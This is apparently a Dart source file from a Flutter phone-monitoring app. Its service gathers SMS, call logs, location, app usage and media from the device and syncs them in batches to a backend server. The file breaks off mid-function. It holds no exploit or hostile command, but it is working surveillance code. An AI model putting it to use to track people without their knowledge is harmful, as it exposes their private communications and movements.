import 'dart:async';
import 'dart:convert';
import 'package:dio/dio.dart';
import 'package:flutter/foundation.dart';
import 'package:monitored_app/app/constants.dart';
import 'package:monitored_app/core/collectors/media_collector.dart';
import 'package:monitored_app/core/collectors/media_store_collector.dart';
import 'package:monitored_app/core/services/battery_monitor_service.dart';
import 'package:monitored_app/core/services/bulk_collect_planner.dart';
import 'package:monitored_app/core/services/collection_ownership_service.dart';
import 'package:monitored_app/core/services/connectivity_service.dart';
import 'package:monitored_app/core/services/database_service.dart';
import 'package:monitored_app/core/services/device_service.dart';
import 'package:uuid/uuid.dart';
import 'package:monitored_app/app/locator.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/collectors/sms_collector.dart';
import 'package:monitored_app/core/collectors/calls_collector.dart';
import 'package:monitored_app/core/collectors/location_collector.dart';
import 'package:monitored_app/core/collectors/apps_collector.dart';
import 'package:monitored_app/core/collectors/base_collector.dart';

import 'package:monitored_app/core/api/api_client.dart';
import 'package:monitored_app/core/services/battery_optimization_service.dart';
import 'package:monitored_app/core/services/media_upload_service.dart';
import 'package:monitored_app/core/utils/retry_mechanism.dart';
import 'package:monitored_app/core/sync/sync_status_monitor.dart';

class NonRetryableSyncException implements Exception {
  final String message;

  const NonRetryableSyncException(this.message);

  @override
  String toString() => message;
}

class _PreparedCollectBatch {
  final List<dynamic> items;
  final List<int> originalIndexes;

  const _PreparedCollectBatch({
    required this.items,
    required this.originalIndexes,
  });

  bool get isEmpty => items.isEmpty;
}

class _BatchSyncResult {
  final Set<int> syncedIndexes;
  final bool shouldRetry;

  const _BatchSyncResult()
      : syncedIndexes = const <int>{},
        shouldRetry = false,
        permanentFailure = false;

  const _BatchSyncResult.synced(this.syncedIndexes)
      : shouldRetry = false,
        permanentFailure = false;

  const _BatchSyncResult.retry()
      : syncedIndexes = const <int>{},
        shouldRetry = true,
        permanentFailure = false;

  const _BatchSyncResult.permanentFailure()
      : syncedIndexes = const <int>{},
        shouldRetry = false,
        permanentFailure = true;

  bool get hasSyncedItems => syncedIndexes.isNotEmpty;
  final bool permanentFailure;
}

class DataCollectorService {
  static const Uuid _uuid = Uuid();
  static const Duration _collectionLeaseTtl = Duration(minutes: 20);
  static const Duration _collectionLeaseHeartbeatInterval =
      Duration(minutes: 5);
  static const BulkCollectLimits _bulkCollectLimits = BulkCollectLimits();
  static const int _maxBulkCollectSplitAttempts = 3;
  static const Set<String> _collectApiDataTypes = {
    'location',
    'messages',
    'sms',
    'calls',
    'app_info',
    'app_usage',
    'media',
    'media_metadata',
  };

  // Maps internal data type names to backend API data_type values.
  // 'sms' and 'media_metadata' are internal names; the backend only knows
  // 'messages' and 'media' respectively.
  static String _mapApiDataType(String dataType) {
    switch (dataType) {
      case 'sms':
        return 'messages';
      case 'media_metadata':
        return 'media';
      default:
        return dataType;
    }
  }

  final StorageService _storageService = locator<StorageService>();
  final ApiClient _apiClient = locator<ApiClient>();
  final BatteryOptimizationService _batteryOptimizationService =
      locator<BatteryOptimizationService>();
  final SyncStatusMonitor _syncStatusMonitor = locator<SyncStatusMonitor>();
  final CollectionOwnershipService _ownershipService =
      locator<CollectionOwnershipService>();

  // Collectors
  final SmsCollector _smsCollector = SmsCollector();
  final CallsCollector _callsCollector = CallsCollector();
  final LocationCollector _locationCollector = LocationCollector();
  final AppsCollector _appsCollector = AppsCollector();
  final MediaCollector _mediaCollector = MediaCollector();
  final MediaStoreCollector _mediaStoreCollector = MediaStoreCollector();

  // Public getter for MediaCollector
  MediaCollector get mediaCollector => _mediaCollector;
  MediaStoreCollector get mediaStoreCollector => _mediaStoreCollector;

  // Sync queue with priority support
  final Map<String, List<dynamic>> _syncQueue = {};
  final Map<String, int> _syncPriorities = {};

  // Retry mechanism map
  final Map<String, RetryMechanism> _syncRetryMap = {};

  // Sync timers and optimization
  Timer? _syncTimer;
  Timer? _prioritySyncTimer;
  Timer? _ownershipHeartbeatTimer;
  Timer? _followUpSyncTimer;
  bool _isInitialized = false;
  bool _isSyncing = false;
  bool _isOptimizing = false;
  bool _isRunning = false; // Tracks whether collectors are actively running
  String? _collectionOwner;
  int _queueRevision = 0;

  // Sync optimization metrics
  final Map<String, int> _syncSuccessCount = {};
  final Map<String, int> _syncFailureCount = {};
  final Map<String, DateTime> _lastSyncAttempt = {};

  // Singleton pattern
  static final DataCollectorService _instance =
      DataCollectorService._internal();
  factory DataCollectorService() => _instance;
  DataCollectorService._internal();

  bool get hasCollectionOwnership => _collectionOwner != null;
  String? get collectionOwner => _collectionOwner;
  bool get isRunning => _isRunning;

  Future<bool> _ensureCollectionOwnership(String owner) async {
    final acquired = await _ownershipService.tryAcquire(
      owner: owner,
      ttl: _collectionLeaseTtl,
    );

    if (!acquired) {
      if (_collectionOwner == owner) {
        _stopOwnershipHeartbeat();
        _collectionOwner = null;
      }
      debugPrint('[DataCollector] Collection lease unavailable for $owner');
      return false;
    }

    _collectionOwner = owner;
    _startOwnershipHeartbeat(owner);
    return true;
  }

  void _startOwnershipHeartbeat(String owner) {
    if (_ownershipHeartbeatTimer?.isActive == true &&
        _collectionOwner == owner) {
      return;
    }

    _ownershipHeartbeatTimer?.cancel();
    _ownershipHeartbeatTimer = Timer.periodic(
      _collectionLeaseHeartbeatInterval,
      (_) async {
        final refreshed = await _ownershipService.heartbeat(owner);
        if (!refreshed) {
          debugPrint(
              '[DataCollector] Collection lease lost for $owner; stopping collectors');
          await stopCollectors(owner: owner, releaseLease: false);
        }
      },
    );
  }

  void _stopOwnershipHeartbeat() {
    _ownershipHeartbeatTimer?.cancel();
    _ownershipHeartbeatTimer = null;
  }

  Future<void> _releaseCollectionOwnership(String? owner) async {
    final leaseOwner = owner ?? _collectionOwner;
    if (leaseOwner == null) {
      return;
    }

    _stopOwnershipHeartbeat();
    await _ownershipService.release(leaseOwner);
    if (_collectionOwner == leaseOwner) {
      _collectionOwner = null;
    }
  }

  Future<void> initialize() async {
    if (_isInitialized) {
      return;
    }

    await _clearLegacyPendingData();

    // Load pending data from database (new database-backed method)
    try {
      final databaseService = locator<DatabaseService>();
      // Set up callback to avoid circular dependency
      databaseService.setDataNotificationCallback((dataType, data) {
        queueForSync(dataType, [data]);
      });
      await databaseService.loadPendingDataToCollector();
    } catch (e) {
      debugPrint('Error loading pending data from database: $e');
    }

    // Apply server configuration to collectors
    await _applyServerConfiguration();

    // Set callbacks for media collectors (other collectors use the database
    // notification path via DatabaseService.setDataNotificationCallback above)
    _mediaCollector.setDataCollectedCallback(queueForSync);
    _mediaStoreCollector.setDataCollectedCallback(queueForSync);

    // Initialize collectors
    await _smsCollector.initialize();
    await _callsCollector.initialize();
    await _locationCollector.initialize();
    await _appsCollector.initialize();
    await _mediaCollector.initialize();
    await _mediaStoreCollector.initialize();

    _isInitialized = true;
  }

  Future<void> _applyServerConfiguration() async {
    try {
      final deviceService = locator<DeviceService>();
      final config = deviceService.getCollectionConfiguration();

      if (config == null) {
        debugPrint('No server configuration available, using defaults');
        return;
      }

      // Apply location configuration
      final locationConfig = config['location'];
      if (locationConfig is Map<String, dynamic>) {
        final intervalSeconds =
            locationConfig['interval_seconds'] as int? ?? 900;
        await _locationCollector.updateCollectionInterval(intervalSeconds);
        debugPrint('Applied location interval: $intervalSeconds seconds');
      }

      // Apply message configuration
      final messagesConfig = config['messages'];
      if (messagesConfig is Map<String, dynamic>) {
        final enabled = messagesConfig['enabled'] as bool? ?? true;
        if (!enabled) {
          await _smsCollector.stopCollecting();
          debugPrint('SMS collection disabled by server configuration');
        }
      }

      // Apply calls configuration
      final callsConfig = config['calls'];
      if (callsConfig is Map<String, dynamic>) {
        final enabled = callsConfig['enabled'] as bool? ?? true;
        if (!enabled) {
          await _callsCollector.stopCollecting();
          debugPrint('Calls collection disabled by server configuration');
        }
      }

      // Apply app usage configuration
      final appUsageConfig = config['app_usage'];
      if (appUsageConfig is Map<String, dynamic>) {
        final enabled = appUsageConfig['enabled'] as bool? ?? true;
        final intervalMinutes =
            appUsageConfig['interval_minutes'] as int? ?? 30;
        if (!enabled) {
          await _appsCollector.stopCollecting();
          debugPrint('App usage collection disabled by server configuration');
        } else {
          await _appsCollector.updateCollectionInterval(intervalMinutes * 60);
          debugPrint('Applied app usage interval: $intervalMinutes minutes');
        }
      }

      // Apply media configuration
      final mediaConfig = config['media'];
      if (mediaConfig is Map<String, dynamic>) {
        final enabled = mediaConfig['enabled'] as bool? ?? true;
        if (!enabled) {
          await _mediaCollector.stopCollecting();
          await _mediaStoreCollector.stopCollecting();
          debugPrint('Media collection disabled by server configuration');
        }
      }

      debugPrint('Server configuration applied successfully');
    } catch (e) {
      debugPrint('Error applying server configuration: $e');
    }
  }

  Future<bool> startCollectors({
    String owner = CollectionLeaseOwner.mainIsolate,
  }) async {
    if (_isRunning) {
      if (_collectionOwner == owner) {
        final stillOwnsCollection = await _ensureCollectionOwnership(owner);
        if (!stillOwnsCollection) {
          await stopCollectors(owner: owner, releaseLease: false);
          return false;
        }
        debugPrint(
            '[DataCollector] startCollectors() skipped: collectors already running for $owner');
        return true;
      }

      debugPrint(
          '[DataCollector] startCollectors() skipped: collectors already running for $_collectionOwner');
      return false;
    }

    final acquired = await _ensureCollectionOwnership(owner);
    if (!acquired) {
      debugPrint(
          '[DataCollector] startCollectors() skipped: another isolate owns collection');
      return false;
    }

    if (!_isInitialized) {
      await initialize();
    }

    try {
      _isRunning = true;

      // Start all collectors
      await _smsCollector.startCollecting();
      await _callsCollector.startCollecting();
      await _locationCollector.startCollecting();
      await _appsCollector.startCollecting();
      await _mediaCollector.startCollecting();
      await _mediaStoreCollector.startCollecting();

      // Start sync timer (every 15 minutes)
      _syncTimer = Timer.periodic(const Duration(minutes: 15), (_) async {
        _syncData(owner: owner);
        // Periodic upload cycle: catches TEMP media even when the queue is
        // empty (no new metadata). Mirrors MediaStore scan cadence.
        final periodicDeviceId = await _resolveBackendDeviceIdForSync();
        if (periodicDeviceId != null) {
          unawaited(
            locator<MediaUploadService>().uploadPendingMedia(periodicDeviceId),
          );
        }
      });

      // Do an initial sync
      _syncData(owner: owner);
      return true;
    } catch (e) {
      _isRunning = false;
      await _releaseCollectionOwnership(owner);
      rethrow;
    }
  }

  Future<void> stopCollectors({
    String? owner,
    bool releaseLease = true,
  }) async {
    _cancelSyncTimers();

    if (!_isRunning) {
      debugPrint(
          '[DataCollector] stopCollectors() skipped: collectors not running');
      if (releaseLease) {
        await _releaseCollectionOwnership(owner);
      }
      return;
    }
    _isRunning = false;

    // Stop all collectors
    await _smsCollector.stopCollecting();
    await _callsCollector.stopCollecting();
    await _locationCollector.stopCollecting();
    await _appsCollector.stopCollecting();
    await _mediaCollector.stopCollecting();
    await _mediaStoreCollector.stopCollecting();

    if (releaseLease) {
      await _releaseCollectionOwnership(owner);
    } else if (owner == null || owner == _collectionOwner) {
      _stopOwnershipHeartbeat();
      _collectionOwner = null;
    }
  }

  void _cancelSyncTimers() {
    _syncTimer?.cancel();
    _syncTimer = null;
    _prioritySyncTimer?.cancel();
    _prioritySyncTimer = null;
    _followUpSyncTimer?.cancel();
    _followUpSyncTimer = null;
  }

  void queueForSync(String dataType, List<dynamic> items, {int priority = 2}) {
    if (items.isEmpty) return;

    // Add items to sync queue
    if (!_syncQueue.containsKey(dataType)) {
      _syncQueue[dataType] = [];
      _syncPriorities[dataType] = priority;
    }

    var addedItems = 0;
    for (final item in items) {
      if (_isDuplicateQueuedItem(dataType, item)) {
        continue;
      }
      _syncQueue[dataType]!.add(item);
      addedItems++;
    }

    if (addedItems == 0) {
      return;
    }
    _queueRevision += addedItems;

    // Update priority if higher priority items are added
    if (_syncPriorities[dataType]! > priority) {
      _syncPriorities[dataType] = priority;
    }

    // Determine sync strategy based on priority and queue size
    if (priority == 1 || _getQueueSize() > 1000) {
      // High priority or large queue - sync immediately
      if (!_isSyncing) {
        _syncData(owner: _collectionOwner);
      }
    } else if (priority == 2 && _getQueueSize() > 100) {
      // Medium priority with moderate queue - sync within 5 minutes
      _schedulePrioritySync(const Duration(minutes: 5));
    }
    // Low priority items wait for regular sync cycle
  }

  int _getQueueSize() {
    return _syncQueue.values.fold(0, (sum, list) => sum + list.length);
  }

  void _schedulePrioritySync(Duration delay) {
    _prioritySyncTimer?.cancel();
    _prioritySyncTimer = Timer(delay, () {
      if (!_isSyncing) {
        _syncData(owner: _collectionOwner);
      }
    });
  }

  Future<void> _syncData({String? owner}) async {
    if (_isSyncing || _syncQueue.isEmpty) {
      debugPrint(
          '[DataCollector] Sync: isSyncing=$_isSyncing, queueEmpty=${_syncQueue.isEmpty}');
      return;
    }

    final leaseOwner = owner ?? _collectionOwner;
    if (leaseOwner == null) {
      debugPrint('[DataCollector] Sync skipped: no collection lease owner');
      return;
    }

    final ownsCollection = await _ensureCollectionOwnership(leaseOwner);
    if (!ownsCollection) {
      debugPrint(
          '[DataCollector] Sync skipped: collection lease owned elsewhere');
      return;
    }

    // Étape 1 — Auth guard: skip sync entirely if no valid access token is stored.
    // This prevents 401 retry loops before the device is authenticated/paired.
    final token = await _storageService.read(AppConstants.tokenKey);
    if (token == null || token.isEmpty) {
      debugPrint(
          '[DataCollector] Sync skipped: no valid auth token in storage');
      return;
    }

    _isSyncing = true;
    _followUpSyncTimer?.cancel();
    _followUpSyncTimer = null;
    _syncStatusMonitor.onSyncStarted();
    final queueRevisionAtStart = _queueRevision;
    var madeProgress = false;

    try {
      // Vérifier la connectivité
      final connectivityService = locator<ConnectivityService>();
      final networkStatus = await connectivityService.checkConnectivity();

      if (networkStatus == NetworkStatus.offline) {
        debugPrint('No network connection, skipping sync');
        _isSyncing = false;
        return;
      }

      // Vérifier le niveau de batterie
      final batteryLevel =
          await locator<BatteryMonitorService>().getCurrentBatteryLevel();
      final deviceId = await _resolveBackendDeviceIdForSync();
      if (deviceId == null) {
        debugPrint('Cannot sync without a valid backend device ID');
        _isSyncing = false;
        return;
      }

      // Sort data types by priority (lower number = higher priority)
      final sortedDataTypes = _syncQueue.keys.toList()
        ..sort((a, b) =>
            (_syncPriorities[a] ?? 3).compareTo(_syncPriorities[b] ?? 3));

      // Try intelligent bulk sync for compatible data types
      final bulkCandidate =
          _identifyBulkSyncCandidate(sortedDataTypes, batteryLevel);
      if (bulkCandidate.isNotEmpty) {
        debugPrint(
          '[BulkSync] Candidates: ${bulkCandidate.map((type) => '$type=${_syncQueue[type]?.length ?? 0}').join(', ')}',
        );
        final bulkSyncedIndexesByType = await _sendOptimizedBulkBatch(
            deviceId, batteryLevel, bulkCandidate);
        final hasBulkSyncedItems = bulkSyncedIndexesByType != null &&
            bulkSyncedIndexesByType.values.any((indexes) => indexes.isNotEmpty);

        if (hasBulkSyncedItems) {
          final allSyncedItems = <Map<String, dynamic>>[];
          for (final entry in bulkSyncedIndexesByType.entries) {
            final dataType = entry.key;
            if (!_syncQueue.containsKey(dataType)) continue;
            final queue = _syncQueue[dataType]!;
            final syncedIndexes = entry.value
                .where((index) => index >= 0 && index < queue.length)
                .toSet();
            if (syncedIndexes.isEmpty) continue;

            final syncedItems = syncedIndexes
                .map((index) => queue[index])
                .whereType<Map<String, dynamic>>()
                .toList(growable: false);
            allSyncedItems.addAll(syncedItems);

            final sortedIndexes = syncedIndexes.toList()
              ..sort((a, b) => b.compareTo(a));
            for (final index in sortedIndexes) {
              queue.removeAt(index);
            }
            if (queue.isEmpty) {
              _syncQueue.remove(dataType);
              _syncPriorities.remove(dataType);
            }

            _recordSyncSuccess(dataType, syncedItems.length);
            _syncStatusMonitor.onSyncCompleted(
              syncedItems.length,
              dataType,
            );
            madeProgress = true;
          }

          // Mark database items as synced
          if (allSyncedItems.isNotEmpty) {
            try {
              final databaseService = locator<DatabaseService>();
              await databaseService.markItemsSynced(allSyncedItems);
            } catch (e) {
              debugPrint('Error marking bulk database items as synced: $e');
            }
          }

          debugPrint(
              'Optimized bulk sync completed: ${bulkCandidate.length} types, ${allSyncedItems.length} items');
          if (bulkCandidate.contains('media_metadata')) {
            unawaited(
              locator<MediaUploadService>().uploadPendingMedia(deviceId),
            );
          }
          if (_syncQueue.isEmpty) {
            _isSyncing = false;
            return;
          }
        }
      }

      // Process individual data types by priority
      for (final dataType in sortedDataTypes) {
        if (!_syncQueue.containsKey(dataType)) continue;

        final items = _syncQueue[dataType]!;
        if (items.isEmpty) continue;

        if (!_isCollectApiDataType(dataType)) {
          await _markUnsupportedCollectTypeAsHandled(dataType);
          madeProgress = true;
          continue;
        }

        // Vérifier si cette tâche doit s'exécuter selon le niveau de batterie et le mode d'optimisation
        final shouldRun = await _batteryOptimizationService.shouldRunTask(
          _getTaskTypeForDataType(dataType),
          batteryLevel,
        );

        if (!shouldRun) {
          debugPrint(
              'Skipping $dataType sync due to battery optimization settings');
          continue;
        }

        // Limiter la taille du lot
        final batchSize = _getBatchSizeForType(dataType);
        final batch = items.take(batchSize).toList();

        // Générer l'ID de lot
        final batchId = _uuid.v4();

        // Envoyer les données au serveur
        final syncResult =
            await _sendDataBatchWithRetry(deviceId, dataType, batch, batchId);

        if (syncResult.hasSyncedItems) {
          // Mark database items as synced
          final syncedItems = syncResult.syncedIndexes
              .where((index) => index >= 0 && index < batch.length)
              .map((index) => batch[index])
              .whereType<Map<String, dynamic>>()
              .toList(growable: false);

          try {
            final databaseService = locator<DatabaseService>();
            await databaseService.markItemsSynced(syncedItems);
          } catch (e) {
            debugPrint('Error marking database items as synced: $e');
          }

          // Supprimer les éléments synchronisés de la file d'attente
          final queue = _syncQueue[dataType]!;
          final sortedIndexes = syncResult.syncedIndexes.toList()
            ..sort((a, b) => b.compareTo(a));
          for (final index in sortedIndexes) {
            if (index >= 0 && index < queue.length && index < batch.length) {
              queue.removeAt(index);
            }
          }
          if (queue.isEmpty) {
            _syncQueue.remove(dataType);
            _syncPriorities.remove(dataType);
          }

          // Record successful sync metrics
          _recordSyncSuccess(dataType, syncedItems.length);
          _syncStatusMonitor.onSyncCompleted(syncedItems.length, dataType);
          madeProgress = true;

          debugPrint(
              'Synced $dataType batch: ${syncedItems.length}/${batch.length} items');
          if (dataType == 'media_metadata') {
            unawaited(
              locator<MediaUploadService>().uploadPendingMedia(deviceId),
            );
          }
        } else if (syncResult.permanentFailure) {
          final failedItems =
              batch.whereType<Map<String, dynamic>>().toList(growable: false);
          try {
            final databaseService = locator<DatabaseService>();
            await databaseService.markItemsPermanentlyFailed(failedItems);
          } catch (e) {
            debugPrint('Error marking permanent $dataType failures: $e');
          }

          final queue = _syncQueue[dataType]!;
          final removeCount = batch.length.clamp(0, queue.length).toInt();
          queue.removeRange(0, removeCount);
          if (queue.isEmpty) {
            _syncQueue.remove(dataType);
            _syncPriorities.remove(dataType);
          }

          _recordSyncFailure(dataType);
          _syncStatusMonitor.onSyncFailed(
              dataType, 'Batch sync failed permanently');
          madeProgress = true;
          debugPrint(
              'Marked $dataType batch as permanently failed after retry budget');
        } else {
          // Record failed sync metrics
          _recordSyncFailure(dataType);
          _syncStatusMonitor.onSyncFailed(
              dataType, 'Batch sync failed after retries');
          debugPrint('Failed to sync $dataType batch even after retries');
          // Keep items in queue for next sync attempt
        }
      }

      // Enregistrer la file d'attente mise à jour
    } catch (e) {
      debugPrint('Error syncing data: $e');
    } finally {
      _isSyncing = false;
      final databaseService = locator<DatabaseService>();
      final queueRevisionBeforeReload = _queueRevision;
      await databaseService.loadPendingDataToCollector();

      final queuedDuringSync = _queueRevision > queueRevisionAtStart;
      final loadedFromDatabase = _queueRevision > queueRevisionBeforeReload;
      final shouldFollowUp = _syncQueue.isNotEmpty &&
          (madeProgress || queuedDuringSync || loadedFromDatabase);

      if (shouldFollowUp) {
        _followUpSyncTimer?.cancel();
        _followUpSyncTimer = Timer(const Duration(seconds: 10), () {
          debugPrint(
            '[DataCollector] Follow-up sync: flushing remaining '
            '${_syncQueue.values.fold(0, (sum, items) => sum + items.length)} items',
          );
          _syncData(owner: _collectionOwner);
        });
      }
    }
  }

  Future<_BatchSyncResult> _sendDataBatch(String deviceId, String dataType,
      List<dynamic> batch, String batchId) async {
    try {
      final validDeviceId = await _ensureValidBackendDeviceId(deviceId);
      if (validDeviceId == null) {
        debugPrint('Sync cancelled for $dataType: invalid backend device ID');
        return const _BatchSyncResult();
      }

      final preparedBatch = _prepareBatchForCollectApi(dataType, batch);
      if (preparedBatch.isEmpty) {
        debugPrint('Skipped $dataType batch: no valid /data/collect items');
        return const _BatchSyncResult();
      }

      final response = await _apiClient.post(
        '/data/collect/',
        data: {
          'device_id': validDeviceId,
          'data_type': _mapApiDataType(dataType),
          'items': preparedBatch.items,
          'metadata': {
            'collection_timestamp': DateTime.now().toUtc().toIso8601String(),
            'battery_level':
                await locator<BatteryMonitorService>().getCurrentBatteryLevel(),
            'network_type': await _getNetworkType(),
            'app_version': '1.0.0',
            'batch_id': batchId,
          }
        },
      );

      if (!_isSuccessfulCollectStatusCode(response.statusCode)) {
        return _isRetryableStatusCode(response.statusCode)
            ? const _BatchSyncResult.retry()
            : const _BatchSyncResult.permanentFailure();
      }

      return _parseSuccessfulCollectResponse(
        response.data,
        dataType,
        preparedBatch.originalIndexes,
      );
    } on DioException catch (e) {
      final statusCode = e.response?.statusCode;
      if (!_isRetryableStatusCode(statusCode)) {
        _logCollectItemErrors(dataType, e.response?.data);
        debugPrint(
            'Non-retryable sync error for $dataType: HTTP ${statusCode ?? 'unknown'}');
        return const _BatchSyncResult.permanentFailure();
      }

      debugPrint(
          'Retryable sync error for $dataType: HTTP ${statusCode ?? 'unknown'}');
      return const _BatchSyncResult.retry();
    } catch (e) {
      debugPrint('Error sending data batch: $e');
      return const _BatchSyncResult.retry();
    }
  }

  Future<String> _getNetworkType() async {
    try {
      final networkStatus =
          await locator<ConnectivityService>().checkConnectivity();
      switch (networkStatus) {
        case NetworkStatus.wifi:
          return 'wifi';
        case NetworkStatus.mobile:
          return 'mobile';
        default:
          return 'unknown';
      }
    } catch (e) {
      return 'unknown';
    }
  }

  int _getBatchSizeForType(String dataType) {
    switch (dataType) {
      case 'sms':
        return 50;
      case 'calls':
        return 50;
      case 'location':
        return 100;
      case 'apps':
        return 200;
      default:
        return 50;
    }
  }

  Future<void> _clearLegacyPendingData() async {
    try {
      if (_storageService.containsKey('pending_data')) {
        await _storageService.remove('pending_data');
        debugPrint(
            'Cleared legacy pending_data cache to avoid duplicate sync queues');
      }
    } catch (e) {
      debugPrint('Error clearing legacy pending_data cache: $e');
    }
  }

  // Méthode publique pour déclencher une synchronisation
  Future<void> syncData({
    String owner = CollectionLeaseOwner.mainIsolate,
  }) async {
    return _syncData(owner: owner);
  }

  Future<void> triggerFullSync({
    String owner = CollectionLeaseOwner.mainIsolate,
  }) async {
    final acquired = await _ensureCollectionOwnership(owner);
    if (!acquired) {
      debugPrint(
          '[DataCollector] Full sync skipped: another isolate owns collection');
      return;
    }

    if (!_isInitialized) {
      await initialize();
    }

    await _collectAndQueue(_smsCollector);
    await _collectAndQueue(_callsCollector);
    await _collectAndQueue(_locationCollector);
    await _collectAndQueue(_appsCollector);

    await _syncData(owner: owner);
  }

  /// Force restart collectors after permission state change
  /// Releases background isolate's lease (old collectors invalid anyway)
  /// Resets state, restarts collectors with fresh permission context
  Future<void> restartCollectorsAfterPermissionChange({
    String owner = CollectionLeaseOwner.mainIsolate,
  }) async {
    try {
      debugPrint(
          '[DataCollector] Stopping prior collectors due to permission change');
      await stopCollectors(owner: _collectionOwner);

      debugPrint(
          '[DataCollector] Restarting collectors after permission change');
      await startCollectors(owner: owner);
    } catch (e) {
      debugPrint(
          '[DataCollector] Error restarting after permission change: $e');
    }
  }

  Future<void> _collectAndQueue(BaseCollector collector) async {
    try {
      final hasPermissions = await collector.checkPermissions();
      if (!hasPermissions) {
        debugPrint(
            '[DataCollector] ${collector.collectorName} full sync skipped: permissions not granted');
        return;
      }

      final data = await collector.collectData();
      if (data.isNotEmpty) {
        await collector.processData(data);
        debugPrint(
            '[DataCollector] ${collector.collectorName} full sync queued ${data.length} items');
      }
    } catch (e) {
      debugPrint(
          '[DataCollector] ${collector.collectorName} full sync failed: $e');
    }
  }

  // Refresh configuration from server and apply changes
  Future<void> refreshConfiguration() async {
    try {
      final deviceService = locator<DeviceService>();
      final success = await deviceService.refreshConfiguration();

      if (success) {
        await _applyServerConfiguration();
        debugPrint('Configuration refreshed and applied successfully');
      } else {
        debugPrint('Failed to refresh configuration from server');
      }
    } catch (e) {
      debugPrint('Error refreshing configuration: $e');
    }
  }

  // Get current collection status for all collectors
  Map<String, bool> getCollectionStatus() {
    return {
      'sms': _smsCollector.getStatistics()['is_collecting'] ?? false,
      'calls': _callsCollector.getStatistics()['is_collecting'] ?? false,
      'location': _locationCollector.getStatistics()['is_collecting'] ?? false,
      'apps': _appsCollector.getStatistics()['is_collecting'] ?? false,
      'media': _mediaCollector.getStatistics()['is_collecting'] ?? false,
      'media_store': _mediaStoreCollector.isCollecting,
    };
  }

  // Nouvelle méthode d'envoi avec mécanisme de réessai
  Future<_BatchSyncResult> _sendDataBatchWithRetry(String deviceId,
      String dataType, List<dynamic> batch, String batchId) async {
    // Initialiser ou réinitialiser le mécanisme de réessai pour ce type de données
    if (!_syncRetryMap.containsKey(dataType)) {
      _syncRetryMap[dataType] = RetryMechanism();
    } else {
      _syncRetryMap[dataType]!.reset();
    }

    final retryMechanism = _syncRetryMap[dataType]!;
    var syncResult = const _BatchSyncResult.retry();

    do {
      // Étape 4 — Per-retry auth guard: stop retry loop if token was revoked/cleared
      // mid-sync (e.g. after a failed refresh that wiped the token from storage).
      final currentToken = await _storageService.read(AppConstants.tokenKey);
      if (currentToken == null || currentToken.isEmpty) {
        debugPrint(
            '[$dataType] Stopping retry loop: auth token no longer available');
        return const _BatchSyncResult();
      }

      try {
        syncResult = await _sendDataBatch(deviceId, dataType, batch, batchId);
        if (syncResult.hasSyncedItems || !syncResult.shouldRetry) {
          return syncResult;
        }

        // Attendre avant de réessayer
        if (retryMechanism.canRetry) {
          final delay = retryMechanism.nextDelay;
          debugPrint(
              'Retry sending $dataType batch in ${delay.inMilliseconds}ms');
          _syncStatusMonitor.onSyncRetry(dataType);
          await Future.delayed(delay);
        }
      } on NonRetryableSyncException catch (e) {
        debugPrint(e.toString());
        return const _BatchSyncResult.permanentFailure();
      } catch (e) {
        debugPrint('Error sending data batch: $e');
        if (retryMechanism.canRetry) {
          final delay = retryMechanism.nextDelay;
          await Future.delayed(delay);
        } else {
          return const _BatchSyncResult.permanentFailure();
        }
      }
    } while (syncResult.shouldRetry && retryMechanism.canRetry);

    if (syncResult.shouldRetry) {
      debugPrint('Retry budget exhausted for $dataType batch $batchId');
      return const _BatchSyncResult.permanentFailure();
    }

    return syncResult;
  }

  // Helper pour déterminer le type de tâche à partir du type de données
  String _getTaskTypeForDataType(String dataType) {
    switch (dataType) {
      case 'location':
        return 'LOCATION';
      case 'sms':
      case 'calls':
        return 'NORMAL';
      case 'media_metadata':
        return 'MEDIA_SYNC';
      case 'app_info':
      case 'app_usage':
        return 'HEAVY_SYNC';
      default:
        return 'NORMAL';
    }
  }

  // Identify optimal bulk sync candidates based on priority, size, and battery
  List<String> _identifyBulkSyncCandidate(
      List<String> sortedDataTypes, int batteryLevel) {
    final candidates = <String>[];
    int totalItems = 0;

    // On low battery, only sync high priority items
    final priorityThreshold = batteryLevel < 30 ? 1 : 2;

    for (final dataType in sortedDataTypes) {
      if (!_isCollectApiDataType(dataType)) continue;

      final apiDataType = _mapApiDataType(dataType);
      if (candidates
          .any((candidate) => _mapApiDataType(candidate) == apiDataType)) {
        continue;
      }

      final priority = _syncPriorities[dataType] ?? 3;
      final itemCount = _syncQueue[dataType]?.length ?? 0;

      if (priority <= priorityThreshold && itemCount > 0) {
        candidates.add(dataType);
        totalItems += itemCount;
      }
    }

    // Need at least 2 types and 10 items to warrant bulk sync
    return candidates.length >= 2 && totalItems >= 10 ? candidates : [];
  }

  // Optimized bulk sync with compression and smart batching
  Future<Map<String, Set<int>>?> _sendOptimizedBulkBatch(
      String deviceId, int batteryLevel, List<String> dataTypes) async {
    try {
      final validDeviceId = await _ensureValidBackendDeviceId(deviceId);
      if (validDeviceId == null) {
        debugPrint('Optimized bulk sync cancelled: invalid backend device ID');
        return null;
      }

      final itemsByType = <String, List<dynamic>>{};
      final apiDataTypes = <String>{};

      for (final dataType in dataTypes) {
        if (!_isCollectApiDataType(dataType)) continue;
        final apiDataType = _mapApiDataType(dataType);
        if (!apiDataTypes.add(apiDataType)) continue;

        final items = _syncQueue[dataType] ?? [];
        if (items.isNotEmpty) {
          itemsByType[dataType] = items;
        }
      }

      if (itemsByType.isEmpty) return null;

      final requests = BulkCollectPlanner.planRequests<dynamic>(
        itemsByType: itemsByType,
        limits: _bulkCollectLimits,
      );

      final syncedIndexesByType = <String, Set<int>>{};
      for (final request in requests) {
        final requestResult = await _sendBulkCollectRequest(
          validDeviceId,
          batteryLevel,
          request,
          _bulkCollectLimits,
          splitAttempt: 0,
        );

        if (requestResult == null) {
          return syncedIndexesByType.isEmpty ? null : syncedIndexesByType;
        }

        _mergeSyncedBulkIndexes(syncedIndexesByType, requestResult);
      }

      return syncedIndexesByType;
    } on DioException catch (e) {
      final statusCode = e.response?.statusCode;
      if (!_isRetryableStatusCode(statusCode)) {
        throw NonRetryableSyncException(
          'Non-retryable bulk sync error: HTTP ${statusCode ?? 'unknown'}',
        );
      }

      debugPrint('Retryable bulk sync error: HTTP ${statusCode ?? 'unknown'}');
      return null;
    } catch (e) {
      debugPrint('Error sending optimized bulk batch: $e');
      return null;
    }
  }

  Future<Map<String, Set<int>>?> _sendBulkCollectRequest(
    String deviceId,
    int batteryLevel,
    BulkCollectRequest<dynamic> request,
    BulkCollectLimits limits, {
    required int splitAttempt,
  }) async {
    try {
